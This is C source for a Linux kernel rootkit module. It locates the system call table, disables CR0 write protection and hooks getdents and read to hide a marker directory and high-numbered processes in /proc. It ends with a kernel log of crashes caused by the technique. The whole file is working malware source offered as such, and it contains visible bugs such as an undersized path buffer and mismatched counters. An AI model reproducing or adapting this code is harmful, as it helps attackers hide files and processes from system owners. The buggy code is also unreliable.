
#include "second.h"
#include "sys_numbers.h"

//
// globals
//
SYSSERV_INF *ssPtr;
int ssSize = NUMBER_OF_FUNCTIONS;

void *sys_call_table;
struct cpumask *cpus;

struct completion synchUnload;
atomic_t unlFlag = ATOMIC_INIT (0);

const char *badDirName = "===1234DEADBEAF4321===";
const char *badPath = "/proc";
long pidHide = 8000;


//
// Functions intercepters
//

int clearDirEntries (struct linux_dirent64 *dirPtr, unsigned int len, int clrFlag) {
	int cur, newLen = len;
	struct linux_dirent64 *tmpPtr = dirPtr;
	long pidVal;
	char *chpEnd;
	
	do {
		cur = dirPtr->d_reclen;
		len -= cur;
		tmpPtr = (struct linux_dirent64*)((char*)dirPtr + cur);
#ifdef MY_OWN_DEBUG
		//printk ("Entry name: %s\n", (char*)&dirPtr->d_type);
#endif
		
		pidVal = simple_strtoul ((char*)&dirPtr->d_type, &chpEnd, 10);
		
		if (strstr ((char*)&dirPtr->d_type, badDirName) != NULL ||
			(clrFlag && pidVal >= pidHide)
			)
		{
			memcpy (dirPtr, tmpPtr, len);
			newLen -= cur;
		} else {
			dirPtr = tmpPtr;
		}
	} while (len > 0);
	
	return newLen;
}


int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int count) {
	int ret, clrFlag = 0;
	//struct files_struct *fdtPtr = NULL;
	struct file *fdPtr = NULL;
	//struct dentry *dePtr = NULL;
	const int bufLen = 128;
	char buf [bufLen - 1], *realPath;
	
	
#ifdef MY_OWN_DEBUG
	printk ("Intercepted function sys_getdents\n");
#endif
	
	atomic64_inc (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
	if (ssPtr[SYS_DIRENT_NUM].sysPtrOld) {
		//
		// "Removing" directories from /proc/PID
		//
		//spin_lock (&current->alloc_lock);
		//fdtPtr = current->files;
		//spin_lock (&fdtPtr->file_lock);
		if ((fdPtr = fget (fd)) == NULL) {
#ifdef MY_OWN_DEBUG
			printk ("Have found NULL ptr to struct file at FDT for descriptor id: %d\n", fd);
#endif
		} else {
			realPath = d_path (&fdPtr->f_path, buf, bufLen);
			printk ("Real path: %s\n", realPath);
			if (strstr (realPath, badPath)) clrFlag = 1;
		}
		fput (fdPtr);
		//spin_unlock (&fdtPtr->file_lock);
		//spin_unlock (&current->alloc_lock);
		
		//
		// "Removing" ordinary files an directories
		//
		if ((ret = ((GETDENTS_P)(ssPtr[SYS_DIRENT_NUM].sysPtrOld)) (fd, dirent, count)) > 0) {
			struct linux_dirent64 *dirPtr = (struct linux_dirent64*)kmalloc (ret, GFP_KERNEL);
			
			copy_from_user (dirPtr, dirent, ret);
			if (clrFlag)
				ret = clearDirEntries (dirPtr, ret, 1);
			else
				ret = clearDirEntries (dirPtr, ret, 0);
			copy_to_user (dirent, dirPtr, ret);
			
			kfree (dirPtr);
		}
		clrFlag = 0;
		
		
		atomic64_dec (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
			complete (&synchUnload);
		}
		return ret;
	} else {
		atomic64_dec (& ssPtr[SYS_DIRENT_NUM].numOfCalls);
		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
			complete (&synchUnload);
		}
		return -EIO;
	}
}
		

ssize_t newRead (int fd, void *buf, size_t count) {
	int ret;
	
	
#ifdef MY_OWN_DEBUG
	//printk ("Intercepted function sys_read\n");
#endif
	
	atomic64_inc (& ssPtr[SYS_READ_NUM].numOfCalls);
	if (ssPtr[SYS_READ_NUM].sysPtrOld) {
		ret = ((READ_P)(ssPtr[SYS_READ_NUM].sysPtrOld)) (fd, buf, count);
		
		atomic64_dec (& ssPtr[SYS_READ_NUM].numOfCalls);
		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
			complete (&synchUnload);
		}
		return ret;
	}
	else {
		atomic64_dec (& ssPtr[SYS_READ_NUM].numOfCalls);
		if (!atomic64_read (& ssPtr[SYS_DIRENT_NUM].numOfCalls) && atomic_read (&unlFlag)) {
			complete (&synchUnload);
		}
		return -EIO;
	}
}

/*
int newMkdir(const char *pathname, mode_t mode) {
	int len = strlen_user (pathname);
	char *chPtr;
	
	
#ifdef MY_OWN_DEBUG
	printk ("Intercepted function sys_mkdir\n");
#endif
	
	if (oldMkdir) {
		if (len <= 0) return ENOENT;
		if ((chPtr = kmalloc (len + 1, GFP_KERNEL)) == NULL) {
#ifdef MY_OWN_DEBUG
			printk ("Insufficient of memory, error of kmalloc\n");
#endif
			return -ENOMEM;
		}
		strncpy_from_user (chPtr, pathname, len);
		chPtr[len] = '\0';
		
		if (strstr (chPtr, badDirName)) {
#ifdef MY_OWN_DEBUG
			printk ("Attempt to creat bad directory\n");
#endif
			kfree (chPtr);
			return -EACCES;
		}
		kfree (chPtr);
		return ((MKDIR_P)oldMkdir) (pathname, mode);
	}
	else return -EIO;
}*/

//
// Service functions od the driver
//

void fillServiceTable (void *sscltPtr) {
	ssPtr[SYS_READ_NUM].sysPtrNew = &newRead;
	ssPtr[SYS_READ_NUM].sysPtrOld = ((void**)sscltPtr)[__NR_read];
	ssPtr[SYS_READ_NUM].sysNum = __NR_read;
	
	ssPtr[SYS_DIRENT_NUM].sysPtrNew = &newGetDents;
	ssPtr[SYS_DIRENT_NUM].sysPtrOld = ((void**)sscltPtr)[__NR_getdents];
	ssPtr[SYS_DIRENT_NUM].sysNum = __NR_getdents;
	
	
	return;
}


void changeSyscallTable (void *scltPtr, int sysNum, void *newPtr, void **oldPtr) {
	// disable memory protection to writing
	asm("pushq %rax");
	asm("movq %cr0, %rax");
	asm("andq $0xfffffffffffeffff, %rax");
	asm("movq %rax, %cr0");
	asm("popq %rax");
	
	*oldPtr = ((void**)scltPtr) [sysNum];
	((void**)sys_call_table) [sysNum] = newPtr;
	
	// enable memory protection to writing
	asm("pushq %rax");
	asm("movq %cr0, %rax");
	asm("xorq $0x0000000000010000, %rax");
	asm("movq %rax, %cr0");
	asm("popq %rax");
	
	return;
}


int setFunc (void *datPtr) {
	DATA_FN *dat = (DATA_FN*)datPtr;
	
	changeSyscallTable (dat->scltPtr, dat->sysNum, dat->newPtr, dat->oldPtr);
	
	return 0;
}


int start (void) {
	int i, lo, hi;
	void *system_call;
	unsigned char *ptr;
	DATA_FN dat;
	
	
	if (!(cpus = kmalloc (sizeof (struct cpumask), GFP_KERNEL))) {
#ifdef MY_OWN_DEBUG
		printk ("Insufficient of memory, error of kmalloc\n");
#endif
		return -ENOMEM;
	}
	cpumask_clear (cpus);
	cpumask_bits (cpus)[0] = 1;
	
	if (!(ssPtr = kmalloc (ssSize * sizeof (SYSSERV_INF), GFP_KERNEL))) {
#ifdef MY_OWN_DEBUG
		printk ("Insufficient of memory, error of kmalloc\n");
#endif
		kfree (cpus);
		return -ENOMEM;
	}
	memset (ssPtr, 0, ssSize * sizeof (SYSSERV_INF));
	fillServiceTable (ssPtr);
	
	//asm volatile("rdmsr" : "=a" (lo), "=d" (hi) : "c" (MSR_LSTAR));
	rdmsr (MSR_LSTAR, lo, hi);
	system_call = (void*)(((long)hi<<32) | lo);
	
	// 0xff14c5 - is opcode of relative call instruction at x64 (relative address is 4 byte value)
	// 500 may be dangerous, we go byte by byte at code of system_call
	for (ptr = system_call, i = 0; i < 500; i++) {
		if (ptr[0] == 0xff && ptr[1] == 0x14 && ptr[2] == 0xc5) {
			sys_call_table = (void*)(0xffffffff00000000 | *((unsigned int*)(ptr+3)));
			break;
		}
		ptr++;
	}
	if (!sys_call_table) return -ENOSYS;
	else {
#ifdef MY_OWN_DEBUG
		printk ("Have found sys_call_table address: %p\n", sys_call_table);
#endif
	}
	
	
	init_completion (&synchUnload);
	
	fillServiceTable (sys_call_table);
	dat.scltPtr = sys_call_table;
	for (int i = 0; i < ssSize; ++i) {
		dat.sysNum = ssPtr[i].sysNum;
		dat.newPtr = ssPtr[i].sysPtrNew;
		dat.oldPtr = & ssPtr[i].sysPtrOld;
		
		stop_machine(&setFunc, &dat, cpus);
	}
	
	
	return 0;
}

void stop (void) {	
	DATA_FN dat = {sys_call_table};
	
#ifdef MY_OWN_DEBUG
	printk ("Unloading start\n");
#endif
	for (int i = 0; i < ssSize; ++i) {
		dat.sysNum = ssPtr[i].sysNum;
		dat.newPtr = ssPtr[i].sysPtrOld;
		dat.oldPtr = & ssPtr[i].sysPtrOld;
		
		stop_machine(&setFunc, &dat, cpus);
	}
	stop_machine(&setFunc, &dat, cpus);
	kfree (cpus);
	kfree (ssPtr);
	
	
	atomic_set (&unlFlag, 1);
	wait_for_completion (&synchUnload);
#ifdef MY_OWN_DEBUG
	printk ("Bye bye\n");
#endif
	
	
	return;
}



module_init(start);
module_exit(stop);
MODULE_LICENSE ("GPL");


//
// Errors due to disabled write protection bit at cr0
//
/*
 * [  869.376793] supervise[5053] general protection ip:7f939d57e517 sp:7fff52f575a0 error:0 in libc-2.17.so[7f939d546000+1a4000]
[  870.963420] Intercepted function sys_mkdir
[  921.156604] supervise[5840] general protection ip:7f3bdd720517 sp:7fff87284a80 error:0 in libc-2.17.so[7f3bdd6e8000+1a4000]
 * */




